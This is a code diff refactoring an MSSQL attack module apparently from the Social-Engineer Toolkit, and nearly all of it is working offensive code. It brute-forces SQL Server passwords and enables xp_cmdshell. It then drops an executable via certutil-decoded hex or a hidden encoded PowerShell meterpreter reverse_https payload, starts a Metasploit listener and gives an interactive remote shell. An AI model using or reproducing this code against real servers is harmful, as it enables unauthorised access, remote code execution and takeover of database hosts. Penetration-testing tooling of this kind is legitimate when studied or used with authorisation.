@@ -1,24 +1,31 @@
 #!/usr/bin/env python
-from src.core.setcore import *
-import sys
-import subprocess
-import socket
-import re
-import os
-import time
-import binascii
-import base64
-import shutil
+# coding=utf-8
 import _mssql
+import binascii
+import os
+import shutil
+import subprocess
+import time
 
+import src.core.setcore as core
+import src.core.tds as tds
+from src.core.payloadgen import create_payloads
+
+# Py2/3 compatibility
+# Python3 renamed raw_input to input
+try:
+    input = raw_input
+except NameError:
+    pass
 
 #
 # this is the mssql modules
 #
 # define the base path
-definepath = definepath()
-operating_system = check_os()
-msf_path = meta_path()
+definepath = core.definepath()
+operating_system = core.check_os()
+msf_path = core.meta_path()
+
 
 #
 # this is the brute forcer
@@ -27,234 +34,264 @@ def brute(ipaddr, username, port, wordlist):
     # if ipaddr being passed is invalid
     if ipaddr == "":
         return False
-    if ipaddr != "":
-        # base counter for successful brute force
-        counter = 0
-        # build in quick wordlist
-        if wordlist == "default":
-            wordlist = "src/fasttrack/wordlist.txt"
 
-        # read in the file
-        password = open(wordlist, "r")
-        for passwords in password:
-            passwords = passwords.rstrip()
+    if ":" in ipaddr:
+        ipaddr = ipaddr.split(":")
+        ipaddr, port = ipaddr
+
+    ipaddr = str(ipaddr)
+    port = str(port)
+
+    # base counter for successful brute force
+    counter = 0
+    # build in quick wordlist
+    if wordlist == "default":
+        wordlist = "src/fasttrack/wordlist.txt"
+
+    # read in the file
+    successful_password = None
+    with open(wordlist) as passwordlist:
+        for password in passwordlist:
+            password = password.rstrip()
             # try actual password
             try:
-
                 # connect to the sql server and attempt a password
-                if ":" in ipaddr:
-                    ipaddr = ipaddr.split(":")
-                    port = ipaddr[1]
-                    ipaddr = ipaddr[0]
 
-                ipaddr = str(ipaddr)
-		port = str(port)
+                print("Attempting to brute force {bold}{ipaddr}:{port}{endc}"
+                      " with username of {bold}{username}{endc}"
+                      " and password of {bold}{passwords}{endc}".format(ipaddr=ipaddr,
+                                                                        username=username,
+                                                                        passwords=password,
+                                                                        port=port,
+                                                                        bold=core.bcolors.BOLD,
+                                                                        endc=core.bcolors.ENDC))
 
-                print("Attempting to brute force " + bcolors.BOLD + ipaddr + ":" + port + bcolors.ENDC + " with username of " + bcolors.BOLD + username + bcolors.ENDC + " and password of " + bcolors.BOLD + passwords + bcolors.ENDC)
-
-                # connect to the sql server and attempt a password
-                if ":" in ipaddr:
-                    ipaddr = ipaddr.split(":")
-                    port = ipaddr[1]
-                    ipaddr = ipaddr[0]
-                target_server = _mssql.connect(ipaddr + ":" + str(port), username, passwords)
+                target_server = _mssql.connect("{0}:{1}".format(ipaddr, port),
+                                               username,
+                                               password)
                 if target_server:
-                    print_status("\nSuccessful login with username %s and password: %s" % (
-                        username, passwords))
+                    core.print_status("\nSuccessful login with username {0} and password: {1}".format(username,
+                                                                                                      password))
                     counter = 1
+                    successful_password = password
                     break
 
             # if login failed or unavailable server
-            except Exception as e:
+            except:
                 pass
 
-        # if we brute forced a machine
-        if counter == 1:
-            if ":" in ipaddr:
-                ipaddr = ipaddr.split(":")
-                ipaddr = ipaddr[0]
-            return ipaddr + "," + username + "," + str(port) + "," + passwords
-        # else we didnt and we need to return a false
-        else:
-            if ipaddr != '':
-                print_warning("Unable to guess the SQL password for %s with username of %s" % (
-                    ipaddr, username))
-            return False
+    # if we brute forced a machine
+    if counter == 1:
+        return ",".join([ipaddr, username, port, successful_password])
+    # else we didnt and we need to return a false
+    else:
+        if ipaddr:
+            core.print_warning("Unable to guess the SQL password for {0} with username of {1}".format(ipaddr, username))
+        return False
+
 
 #
 # this will deploy an already prestaged executable that reads in hexadecimal and back to binary
 #
 def deploy_hex2binary(ipaddr, port, username, password):
-
     # base variable used to select payload option
-    choice1 = "1"
+    option = None
 
-    conn = _mssql.connect(ipaddr + ":" + str(port), username, password)
-    print_status("Enabling the xp_cmdshell stored procedure...")
+    conn = _mssql.connect("{0}:{1}".format(ipaddr, port),
+                          username,
+                          password)
+    core.print_status("Enabling the xp_cmdshell stored procedure...")
     try:
-        conn.execute_query("exec master.dbo.sp_configure 'show advanced options',1;GO;RECONFIGURE;GO;exec master.dbo.sp_configure 'xp_cmdshell', 1;GO;RECONFIGURE;GO")
-    except: pass
+        conn.execute_query("exec master.dbo.sp_configure 'show advanced options',1;"
+                           "GO;"
+                           "RECONFIGURE;"
+                           "GO;"
+                           "exec master.dbo.sp_configure 'xp_cmdshell', 1;"
+                           "GO;"
+                           "RECONFIGURE;"
+                           "GO")
+    except:
+        pass
     # just throw a simple command via powershell to get the output
     try:
-       print("""Pick which deployment method to use. The first is PowerShell and should be used on any modern operating system. The second method will use the certutil method to convert a binary to a binary""")
-       choice = raw_input("Enter your choice:\n\n1.) Use PowerShell Injection (recommended)\n2.) Use Certutil binary conversion\n\nEnter your choice [1]:")
-       if choice == "": choice = "1"
-       if choice == "1":
-         print_status("Powershell injection was selected to deploy to the remote system (awesome).")
-         option_ps = input(
-            "Do you want to use powershell injection? [yes/no]:")
-         if option_ps.lower() == "" or option_ps == "y" or option_ps == "yes":
-            option = "1"
-            print_status("Powershell delivery selected. Boom!")
-         else:
+        print("""Pick which deployment method to use. The first is PowerShell
+         and should be used on any modern operating system. The second method
+         will use the certutil method to convert a binary to a binary""")
+
+        choice = input("Enter your choice:\n\n"
+                       "1.) Use PowerShell Injection (recommended)\n"
+                       "2.) Use Certutil binary conversion\n\n"
+                       "Enter your choice [1]:")
+        if choice == "":
+            choice = "1"
+        if choice == "1":
+            core.print_status("Powershell injection was selected to deploy to the remote system (awesome).")
+            option_ps = input("Do you want to use powershell injection? [yes/no]:")
+            if option_ps.lower() == "" or option_ps == "y" or option_ps == "yes":
+                option = "1"
+                core.print_status("Powershell delivery selected. Boom!")
+            else:
+                option = "2"
+
+        # otherwise, fall back to the older version using debug conversion via hex
+        else:
+            core.print_status("Powershell not selected, using debug method.")
             option = "2"
 
-       # otherwise, fall back to the older version using debug conversion via hex
-       else:
-        print_status("Powershell not selected, using debug method.")
-        option = "2"
-
     except Exception as err:
-        print err
+        print(err)
+    payload_filename = None
 
     # if we don't have powershell
     if option == "2":
         # give option to use msf or your own
-        print_status("You can either select to use a default Metasploit payload here or import your own in order to deliver to the system. Note that if you select your own, you will need to create your own listener at the end in order to capture this.")
-        choice1 = raw_input("\n\n1.) Use Metasploit (default)\n2.) Select your own\n\nEnter your choice[1]:")
-        if choice1 == "": choice1 = "1"
+        core.print_status("You can either select to use a default "
+                          "Metasploit payload here or import your "
+                          "own in order to deliver to the system. "
+                          "Note that if you select your own, you "
+                          "will need to create your own listener "
+                          "at the end in order to capture this.\n\n")
+        choice1 = input("1.) Use Metasploit (default)\n"
+                        "2.) Select your own\n\n"
+                        "Enter your choice[1]:")
+        if choice1 == "":
+            choice1 = "1"
 
         if choice1 == "2":
-            filename = raw_input("Enter the path to your file you want to deploy to the system (ex /root/blah.exe):")
-            if os.path.isfile(filename):
-                fileopen = open(filename, "rb")
-            else:
-                print_error("File not found! Try again.")
-                filename = raw_input("Enter the path to your file you want to deploy to the system (ex /root/blah.exe):")
-                if os.path.isfile(filename):
-                    fileopen = open(filename, "rb")
+            attempts = 0
+            while attempts <= 2:
+                payload_filename = input("Enter the path to your file you want to deploy to the system (ex /root/blah.exe):")
+                if os.path.isfile(payload_filename):
+                    break
                 else:
-                    print_error("Computers are hard. Find the path and try again. Defaulting to Metasploit payload.")
-                    choice1 = "1"
+                    core.print_error("File not found! Try again.")
+                    attempts += 1
+            else:
+                core.print_error("Computers are hard. Find the path and try again. Defaulting to Metasploit payload.")
+                choice1 = "1"
 
         if choice1 == "1":
+            web_path = None
             try:
-                module_reload(src.core.payloadgen.create_payloads)
+                core.module_reload(create_payloads)
             except:
                 import src.core.payloadgen.create_payloads
 
-
                 # if we are using a SET interactive shell payload then we need to make
                 # the path under web_clone versus ~./set
-                if os.path.isfile(setdir + "/set.payload"):
-                    web_path = (setdir + "/web_clone/")
+                if os.path.isfile(os.path.join(core.setdir, "set.payload")):
+                    web_path = os.path.join(core.setdir, "web_clone")
                     # then we are using metasploit
-                if not os.path.isfile(setdir + "/set.payload"):
-                        if operating_system == "posix":
-                            web_path = (setdir)
-                            # if it isn't there yet
-                            if not os.path.isfile(setdir + "/1msf.exe"):
-                                # move it then
-                                subprocess.Popen("cp %s/msf.exe %s/1msf.exe" %
-                                                (setdir, setdir), shell=True).wait()
-                                subprocess.Popen("cp %s/1msf.exe %s/ 1> /dev/null 2> /dev/null" %
-                                                (setdir, setdir), shell=True).wait()
-                                subprocess.Popen("cp %s/msf2.exe %s/msf.exe 1> /dev/null 2> /dev/null" %
-                                                (setdir, setdir), shell=True).wait()
+                else:
+                    if operating_system == "posix":
+                        web_path = core.setdir
+                        # if it isn't there yet
+                        if not os.path.isfile(core.setdir + "1msf.exe"):
+                            # move it then
+                            subprocess.Popen("cp %s/msf.exe %s/1msf.exe" %
+                                             (core.setdir, core.setdir), shell=True).wait()
+                            subprocess.Popen("cp %s/1msf.exe %s/ 1> /dev/null 2> /dev/null" %
+                                             (core.setdir, core.setdir), shell=True).wait()
+                            subprocess.Popen("cp %s/msf2.exe %s/msf.exe 1> /dev/null 2> /dev/null" %
+                                             (core.setdir, core.setdir), shell=True).wait()
+            payload_filename = os.path.join(web_path, "1msf.exe")
 
-        if choice1 == "1":
-            fileopen = open("%s/1msf.exe" % (web_path), "rb")
+        with open(payload_filename, "rb") as fileopen:
+            # read in the binary
+            data = fileopen.read()
+            # convert the binary to hex
+            data = binascii.hexlify(data)
+            # we write out binary out to a file
 
-        # read in the binary
-        data = fileopen.read()
-        # convert the binary to hex
-        data = binascii.hexlify(data)
-        # we write out binary out to a file
-        filewrite = open(setdir + "/payload.hex", "w")
-        filewrite.write(data)
-        filewrite.close()
+        with open(os.path.join(core.setdir, "payload.hex"), "w") as filewrite:
+            filewrite.write(data)
 
         if choice1 == "1":
             # if we are using metasploit, start the listener
-            if not os.path.isfile(setdir + "/set.payload"):
+            if not os.path.isfile(os.path.join(core.setdir, "set.payload")):
                 if operating_system == "posix":
                     try:
-                        module_reload(pexpect)
+                        core.module_reload(pexpect)
                     except:
                         import pexpect
-                        print_status("Starting the Metasploit listener...")
-                        msf_path = meta_path()
-                        child2 = pexpect.spawn("%smsfconsole -r %s/meta_config\r\n\r\n" % (meta_path(), setdir))
+                        core.print_status("Starting the Metasploit listener...")
+                        msf_path = core.meta_path()
+                        child2 = pexpect.spawn("{0}-r {1}\r\n\r\n".format(os.path.join(core.meta_path(), "msfconsole"),
+                                                                        os.path.join(core.setdir, "meta_config")))
 
         # random executable name
-        random_exe = generate_random_string(10, 15)
+        random_exe = core.generate_random_string(10, 15)
 
     #
     # next we deploy our hex to binary if we selected option 1 (powershell)
     #
     if option == "1":
-        print_status(
-            "Using universal powershell x86 process downgrade attack..")
+        core.print_status("Using universal powershell x86 process downgrade attack..")
         payload = "x86"
 
         # specify ipaddress of reverse listener
-        ipaddr = grab_ipaddress()
-        update_options("IPADDR=" + ipaddr)
-        port = input(
-            setprompt(["29"], "Enter the port for the reverse [443]"))
-        if port == "":
+        ipaddr = core.grab_ipaddress()
+        core.update_options("IPADDR=" + ipaddr)
+        port = input(core.setprompt(["29"], "Enter the port for the reverse [443]"))
+
+        if not port:
             port = "443"
-        update_options("PORT=" + port)
-        update_options("POWERSHELL_SOLO=ON")
-        print_status(
-            "Prepping the payload for delivery and injecting alphanumeric shellcode...")
-        filewrite = open(setdir + "/payload_options.shellcode", "w")
-        # format needed for shellcode generation
-        filewrite.write("windows/meterpreter/reverse_https" + " " + port + ",")
-        filewrite.close()
+
+        core.update_options("PORT={0}".format(port))
+        core.update_options("POWERSHELL_SOLO=ON")
+        core.print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
+
+        with open(os.path.join(core.setdir, "/payload_options.shellcode"), "w") as filewrite:
+            # format needed for shellcode generation
+            filewrite.write("windows/meterpreter/reverse_https {0},".format(port))
+
         try:
-            module_reload(src.payloads.powershell.prep)
+            core.module_reload(src.payloads.powershell.prep)
         except:
             import src.payloads.powershell.prep
-        # create the directory if it does not exist
-        if not os.path.isdir(setdir + "/reports/powershell"):
-            os.makedirs(setdir + "/reports/powershell")
 
-        x86 = open(setdir + "/x86.powershell", "r")
-        x86 = x86.read()
-        x86 = "powershell -nop -window hidden -noni -EncodedCommand " + x86
-        print_status(
-            "If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
-        filewrite = open(
-            setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
-        filewrite.write(x86)
-        filewrite.close()
+        # create the directory if it does not exist
+        if not os.path.isdir(os.path.join(core.setdir, "reports/powershell")):
+            os.makedirs(os.path.join(core.setdir, "reports/powershell"))
+
+        with open(os.path.join(core.setdir, "x86.powershell")) as x86:
+            x86 = x86.read()
+
+        x86 = "powershell -nop -window hidden -noni -EncodedCommand {0}".format(x86)
+        core.print_status("If you want the powershell commands and attack, "
+                          "they are exported to {0}".format(os.path.join(core.setdir, "reports/powershell")))
+        with open(os.path.join(core.setdir, "/reports/powershell/x86_powershell_injection.txt"), "w") as filewrite:
+            filewrite.write(x86)
+
         # if our payload is x86 based - need to prep msfconsole rc
         if payload == "x86":
             powershell_command = x86
-            powershell_dir = setdir + "/reports/powershell/x86_powershell_injection.txt"
-            filewrite = open(setdir + "/reports/powershell/powershell.rc", "w")
-            filewrite.write(
-                "use multi/handler\nset payload windows/meterpreter/reverse_https\nset lport %s\nset LHOST 0.0.0.0\nexploit -j" % (port))
-            filewrite.close()
+            # powershell_dir = core.setdir + "/reports/powershell/x86_powershell_injection.txt"
+            with open(os.path.join(core.setdir, "reports/powershell/powershell.rc"), "w") as filewrite:
+                filewrite.write("use multi/handler\n"
+                                "set payload windows/meterpreter/reverse_https\n"
+                                "set lport {0}\n"
+                                "set LHOST 0.0.0.0\n"
+                                "exploit -j".format(port))
+        else:
+            powershell_command = None
 
         # grab the metasploit path from config or smart detection
-        msf_path = meta_path()
+        msf_path = core.meta_path()
         if operating_system == "posix":
+
             try:
-                module_reload(pexpect)
+                core.module_reload(pexpect)
             except:
                 import pexpect
-            print_status("Starting the Metasploit listener...")
-            child2 = pexpect.spawn(
-                "%smsfconsole -r %s/reports/powershell/powershell.rc" % (msf_path, setdir))
-            print_status(
-                "Waiting for the listener to start first before we continue forward...")
-            print_status(
-                "Be patient, Metaploit takes a little bit to start...")
+
+            core.print_status("Starting the Metasploit listener...")
+            child2 = pexpect.spawn("{0} -r {1}".format(os.path.join(msf_path, "msfconsole"),
+                                                     os.path.join(core.setdir, "reports/powershell/powershell.rc")))
+            core.print_status("Waiting for the listener to start first before we continue forward...")
+            core.print_status("Be patient, Metaploit takes a little bit to start...")
             child2.expect("Starting the payload handler", timeout=30000)
-            print_status(
-                "Metasploit started... Waiting a couple more seconds for listener to activate..")
+            core.print_status("Metasploit started... Waiting a couple more seconds for listener to activate..")
             time.sleep(5)
 
         # assign random_exe command to the powershell command
@@ -267,31 +304,33 @@ def deploy_hex2binary(ipaddr, port, username, password):
     if option == "2":
 
         # here we start the conversion and execute the payload
-        print_status("Sending the main payload via to be converted back to a binary.")
+        core.print_status("Sending the main payload via to be converted back to a binary.")
         # read in the file 900 bytes at a time
-        fileopen = open(setdir + "/payload.hex", "r")
-        print_status("Dropping inital begin certificate header...")
-        conn.execute_query("exec master ..xp_cmdshell 'echo -----BEGIN CERTIFICATE----- > %s.crt'" % (random_exe))
-        while fileopen:
-            data = fileopen.read(900).rstrip()
-            # if data is done then break out of loop because file is over
-            if data == "":
-                break
-            print_status("Deploying payload to victim machine (hex): " + bcolors.BOLD + str(data) + bcolors.ENDC + "\n")
-            conn.execute_query("exec master..xp_cmdshell 'echo %s >> %s.crt'" % (data, random_exe))
-        print_status("Delivery complete. Converting hex back to binary format.")
-        print_status("Dropping end header for binary format converstion...")
-        conn.execute_query("exec master ..xp_cmdshell 'echo -----END CERTIFICATE----- >> %s.crt'" % (random_exe))
-        print_status("Converting hex binary back to hex using certutil - Matthew Graeber man crush enabled.")
-        conn.execute_query("exec master..xp_cmdshell 'certutil -decode %s.crt %s.exe'" % (random_exe, random_exe))
-        print_status("Executing the payload - magic has happened and now its time for that moment.. You know. When you celebrate. Salute to you ninja - you deserve it.")
-        conn.execute_query("exec master..xp_cmdshell '%s.exe'" % (random_exe))
+        with open(os.path.join(core.setdir, 'payload.hex')) as fileopen:
+            core.print_status("Dropping initial begin certificate header...")
+            conn.execute_query("exec master ..xp_cmdshell 'echo -----BEGIN CERTIFICATE----- > {0}.crt'".format(random_exe))
+            for data in fileopen.read(900).rstrip():
+                if not data:
+                    continue
+                core.print_status("Deploying payload to victim machine (hex): {bold}{data}{endc}\n".format(bold=core.bcolors.BOLD,
+                                                                                                           data=data,
+                                                                                                           endc=core.bcolors.ENDC))
+                conn.execute_query("exec master..xp_cmdshell 'echo {data} >> {exe}.crt'".format(data=data,
+                                                                                                exe=random_exe))
+        core.print_status("Delivery complete. Converting hex back to binary format.")
+        core.print_status("Dropping end header for binary format conversion...")
+        conn.execute_query("exec master ..xp_cmdshell 'echo -----END CERTIFICATE----- >> {0}.crt'".format(random_exe))
+        core.print_status("Converting hex binary back to hex using certutil - Matthew Graeber man crush enabled.")
+        conn.execute_query("exec master..xp_cmdshell 'certutil -decode {0}.crt {0}.exe'".format(random_exe))
+        core.print_status("Executing the payload - magic has happened and now its time for that moment.. "
+                          "You know. When you celebrate. Salute to you ninja - you deserve it.")
+        conn.execute_query("exec master..xp_cmdshell '{0}.exe'".format(random_exe))
         # if we are using SET payload
         if choice1 == "1":
-            if os.path.isfile(setdir + "/set.payload"):
-                print_status("Spawning seperate child process for listener...")
+            if os.path.isfile(os.path.join(core.setdir, "set.payload")):
+                core.print_status("Spawning separate child process for listener...")
                 try:
-                    shutil.copyfile(setdir + "/web_clone/x", definepath)
+                    shutil.copyfile(os.path.join(core.setdir, "web_clone/x"), definepath)
                 except:
                     pass
 
@@ -299,42 +338,43 @@ def deploy_hex2binary(ipaddr, port, username, password):
                 subprocess.Popen("python src/html/fasttrack_http_server.py", shell=True)
                 # grab the port options
 
-                if check_options("PORT=") != 0:
-                    port = check_options("PORT=")
-
-                # if for some reason the port didnt get created we default to 443
-                else:
-                    port = "443"
+                # if core.check_options("PORT=") != 0:
+                #     port = core.heck_options("PORT=")
+                #
+                # # if for some reason the port didnt get created we default to 443
+                # else:
+                #     port = "443"
 
     # thread is needed here due to the connect not always terminating thread,
     # it hangs if thread isnt specified
     try:
-        module_reload(thread)
+        core.module_reload(thread)
     except:
         import thread
 
     # execute the payload
     # we append more commands if option 1 is used
     if option == "1":
-        print_status("Triggering the powershell injection payload... ")
-        sql_command = ("exec master..xp_cmdshell '%s'" % (powershell_command))
+        core.print_status("Triggering the powershell injection payload... ")
+        sql_command = ("exec master..xp_cmdshell '{0}'".format(powershell_command))
         thread.start_new_thread(conn.execute_query, (sql_command,))
 
     # using the old method
     if option == "2":
-        print_status("Triggering payload stager...")
+        core.print_status("Triggering payload stager...")
         alphainject = ""
-        if os.path.isfile(setdir + "meterpreter.alpha"):
-            alphainject = fileopen(setdir + "meterpreter.alpha", "r").read()
+        if os.path.isfile(os.path.join(core.setdir, "meterpreter.alpha")):
+            with open(os.path.join(core.setdir, "meterpreter.alpha")) as fileopen:
+                alphainject = fileopen.read()
 
-        sql_command = ("xp_cmdshell '%s.exe %s'" % (random_exe, alphainject))
+        sql_command = ("xp_cmdshell '{0}.exe {1}'".format(random_exe, alphainject))
         # start thread of SQL command that executes payload
         thread.start_new_thread(conn.execute_query, (sql_command,))
         time.sleep(1)
 
         # if pexpect doesnt exit right then it freaks out
     if choice1 == "1":
-        if os.path.isfile(setdir + "/set.payload"):
+        if os.path.isfile(os.path.join(core.setdir, "set.payload")):
             os.system("python ../../payloads/set_payloads/listener.py")
         try:
             # interact with the child process through pexpect
@@ -352,27 +392,30 @@ def deploy_hex2binary(ipaddr, port, username, password):
 #
 def cmdshell(ipaddr, port, username, password, option):
     # connect to SQL server
-    import src.core.tds as tds
     mssql = tds.MSSQL(ipaddr, int(port))
     mssql.connect()
     mssql.login("master", username, password)
-    print_status("Connection established with SQL Server...")
-    print_status("Attempting to re-enable xp_cmdshell if disabled...")
+    core.print_status("Connection established with SQL Server...")
+    core.print_status("Attempting to re-enable xp_cmdshell if disabled...")
     try:
-        mssql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
-    except Exception as e:
+        mssql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;"
+                        "RECONFIGURE;"
+                        "exec master.dbo.sp_configure 'xp_cmdshell', 1;"
+                        "RECONFIGURE;")
+    except:
         pass
-    print_status("Enter your Windows Shell commands in the xp_cmdshell - prompt...")
-    while 1:
+    core.print_status("Enter your Windows Shell commands in the xp_cmdshell - prompt...")
+
+    while True:
         # prompt mssql
         cmd = input("mssql>")
         # if we want to exit
         if cmd == "quit" or cmd == "exit":
             break
         # if the command isnt empty
-        if cmd != "":
+        elif cmd:
             # execute the command
-            mssql.sql_query("exec master..xp_cmdshell '%s'" % (cmd))
+            mssql.sql_query("exec master..xp_cmdshell '{0}'".format(cmd))
             # print the rest of the data
             mssql.printReplies()
             mssql.colMeta[0]['TypeData'] = 80 * 2
